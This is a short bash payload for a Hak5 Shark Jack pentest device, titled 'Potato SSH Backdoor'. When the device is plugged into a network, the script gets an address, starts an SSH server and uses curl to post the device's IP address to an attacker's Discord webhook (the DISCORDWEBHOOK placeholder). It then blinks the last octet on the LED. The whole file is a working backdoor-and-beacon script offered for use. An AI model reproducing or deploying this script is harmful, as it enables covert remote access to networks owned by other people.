#!/bin/bash
#
# Title:        Potato SSH Backdoor [ft. Discord Webhooks]
# Author:       C0SM0, inspired from Hak5Darren
#
# Magenta...........Setup
# Red Slow Blink....Failed to obtain IP address
# Cyan Fast Blink...A non-zero digit of last octet
# Cyan Solid........A zero digit of last octet

LED SETUP
# Set NETMODE to DHCP_CLIENT for Shark Jack v1.1.0+
NETMODE DHCP_CLIENT
# Wait for an IP address to be obtained
while ! ifconfig eth0 | grep "inet addr"; do sleep 1; done

# Start SSH server
/etc/init.d/sshd start
sleep 10
LASTOCTET=$(ifconfig eth0 | grep "inet addr" | awk {'print $2'} | awk -F. {'print $4'})
ADDRESS=$(ifconfig eth0 | grep "inet addr" | awk {'print $2'}) > ip.txt

# Put Discord Webhook here
curl -F "payload_json={\"username\": \"Sharktato\", \"content\": \""$ADDRESS"\"}" DISCORDWEBHOOK

LED OFF

if [ -z "$LASTOCTET" ]; then
	LED FAIL
	exit
fi

while true; do
	for (( i = 0; i < ${#LASTOCTET}; i++ )); do
		DIGIT=${LASTOCTET:$i:1}

		if [ $DIGIT = "0" ]; then
			LED C SOLID; sleep 1
			LED OFF; sleep 0125
		else
			for (( j = 0; j < $DIGIT; j++ )); do
				LED C SOLID; sleep 0.05
				LED OFF; sleep 0.125
			done
		fi

		sleep 1
	done

	sleep 2
done
